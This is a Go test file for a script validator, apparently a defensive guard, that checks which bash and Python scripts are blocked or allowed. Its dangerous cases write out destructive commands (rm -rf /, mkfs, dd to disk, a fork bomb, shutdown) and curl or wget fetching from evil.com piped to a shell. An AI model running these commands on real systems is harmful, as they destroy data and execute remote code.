package scriptguard

import "testing"

func TestValidate_DangerousBash(t *testing.T) {
	cases := []struct {
		name   string
		script string
	}{
		{"rm -rf /", "rm -rf /"},
		{"rm -rf / with space", "rm -rf / "},
		{"rm -rf /etc", "rm -rf /etc"},
		{"rm -rf /var/", "rm -rf /var/"},
		{"rm -f /usr", "rm -f /usr"},
		{"mkfs", "mkfs.ext4 /dev/sda1"},
		{"dd to device", "dd if=/dev/zero of=/dev/sda bs=1M"},
		{"fork bomb", ":(){ :|:& };:"},
		{"shutdown", "shutdown -h now"},
		{"reboot", "reboot"},
		{"poweroff", "poweroff"},
		{"halt", "halt"},
		{"init 0", "init 0"},
		{"init 6", "init 6"},
		{"chmod 777 /", "chmod 777 /"},
		{"chmod -R 777 /", "chmod -R 777 /"},
		{"pipe curl to bash", "curl http://evil.com/x.sh | bash"},
		{"pipe wget to sh", "wget http://evil.com/x.sh | sh"},
		{"overwrite disk", "> /dev/sda"},
		{"embedded dangerous", "echo hello; rm -rf /"},
		{"multiline dangerous", "ls -la\nrm -rf /"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			err := Validate(tc.script, "bash")
			if err == nil {
				t.Errorf("expected error for dangerous script %q, got nil", tc.script)
			}
		})
	}
}

func TestValidate_SafeBash(t *testing.T) {
	cases := []struct {
		name   string
		script string
	}{
		{"echo", "echo hello"},
		{"ls", "ls -la /tmp"},
		{"cat", "cat /etc/hostname"},
		{"rm file", "rm /tmp/test.log"},
		{"rm -f file", "rm -f /tmp/test.log"},
		{"mkdir", "mkdir -p /opt/app"},
		{"curl no pipe", "curl http://example.com -o /tmp/file"},
		{"wget no pipe", "wget http://example.com -O /tmp/file"},
		{"systemctl", "systemctl restart nginx"},
		{"docker", "docker ps"},
		{"empty", ""},
		{"deploy script", "cd /opt/app && git pull && systemctl restart app"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			err := Validate(tc.script, "bash")
			if err != nil {
				t.Errorf("expected nil for safe script %q, got %v", tc.script, err)
			}
		})
	}
}

func TestValidate_DangerousPython(t *testing.T) {
	cases := []struct {
		name   string
		script string
	}{
		{"os.system rm", `import os; os.system("rm -rf /")`},
		{"subprocess.run rm", `import subprocess; subprocess.run("rm -rf /")`},
		{"subprocess.call mkfs", `subprocess.call("mkfs.ext4 /dev/sda1")`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			err := Validate(tc.script, "python")
			if err == nil {
				t.Errorf("expected error for dangerous python script %q, got nil", tc.script)
			}
		})
	}
}

func TestValidate_SafePython(t *testing.T) {
	cases := []struct {
		name   string
		script string
	}{
		{"print", `print("hello")`},
		{"os.path", `import os; print(os.path.exists("/tmp"))`},
		{"subprocess ls", `import subprocess; subprocess.run("ls -la")`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			err := Validate(tc.script, "python")
			if err != nil {
				t.Errorf("expected nil for safe python script %q, got %v", tc.script, err)
			}
		})
	}
}
